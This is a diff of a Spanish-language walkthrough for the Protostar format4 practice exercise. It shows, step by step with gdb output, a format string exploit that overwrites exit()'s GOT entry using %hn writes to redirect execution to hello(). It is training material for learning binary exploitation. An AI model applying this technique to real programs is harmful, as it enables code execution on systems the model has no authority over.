@@ -297,7 +297,6 @@ $5 = 255
 you have modified the target :)
 ```
 
-
 Articulo que me ha ayudado y del que he aprendido [aqui](https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83)
 
 ---------------------------------------------------------------------------
@@ -347,7 +346,7 @@ Instrucciones de main entre ellas, saltar a vuln()
 (gdb) disas vuln
 ...
 0x0804850f <vuln+61>:	call   0x80483ec <exit@plt> -> Entrada en la tabla plt de exit()
-(gdb) x/i 0x80483ec       -> Nos interesa ver la primera inturccion de plt (la que tiene relacion con la GOT, no las del ld.so)
+(gdb) x/i 0x80483ec       -> Nos interesa ver la primera instruccion de plt (la que tiene relacion con la GOT, no las del ld.so)
 0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada a la GOT de exit()
 (gdb) x 0x8049724
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 -> Código de exit()
@@ -372,10 +371,64 @@ Hay que explotarlo con el format string. Ya adelanto que es el 4º argumento.
 > **%4$x"\*4** Escribir a partir del cuarto elemento (pero no en la memoria de ningun puntero de la pila como con %n sino en la pila en sí)
 
 ```console
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%4$x")' | ./format4
-AAAA41414141
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%4$x"*4)' | ./format4
-AAAA41414141414141414141414141414141
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%x."*4)' | ./format4
+AAAA200.b7fd8420.bffff524.41414141
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' | ./format4
+Segmentation fault
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' > /tmp/pattern
 ```
-Para escribir en la primera entrada de exit plt (la que le dice a GOT que funcion llamar), se toma la direccion de exit de antes (0x8049724)
+Como nos sale SEGFAULT todo el rato, lo metemos en un archivo (/tmp/pattern) y abrimos el binario con gdb
+Sabemos de antes que el resultado de la GOT original de exit() es "0x8049724" pero tiene que ser hello() "0x080484b4"
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
+(gdb) set disassembly-flavor intel
+(gdb) disas vuln
+...
+0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
+0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
+0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
+(gdb) break * 0x08048503 -> Antes de que modifique el GOT por meter los comandos de la pila 
+(gdb) break * 0x0804850f -> Instruccion de exit
+(gdb) run < /tmp/pattern
+Breakpoint 1 alcanzado!
+(gdb) x/i 0x80483ec
+0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724  -> Saltamos a la GOT...
+(gdb) x/x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2 -> El valor original que tendría la GOT (saltar al dl.so para buscar la direccion...)
+(gdb) x/2i 0x080483f2 
+0x80483f2 <exit@plt+6>:	push   0x30
+0x80483f7 <exit@plt+11>:	jmp    0x804837c
+(gdb) c
+Continuing.
+(gdb) x/x 0x8049724 -> Pero ahora en vez de eso tenemos que en la GOT hemos escrito "0x4"
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004
+```
+Usaremos el truco de antes de las memorias de 2 bytes
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%4$hn%5$hn")' > /tmp/pattern
+user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
+(gdb) break * 0x0804850f
+(gdb) run < /tmp/pattern
+x/x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00090009
+(gdb) print 0x84b4 - 0x0009
+$15 = 33963
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%33963x%4$hn%5$hn")' > /tmp/pattern
+(gdb) run < /tmp/pattern
+(gdb) x/x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x84b484b4
+(gdb) p &hello
+$16 = (void (*)(void)) 0x80484b4 <hello>
+(gdb) print 0x0804 - 0x84b4
+$17 = -31920
+(gdb) print 0x10804 - 0x84b4
+$19 = 33616
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%33963x%4$hn%33616x%5$hn")' | ./format4
+code execution redirected! you win
+```
+
+
+
 
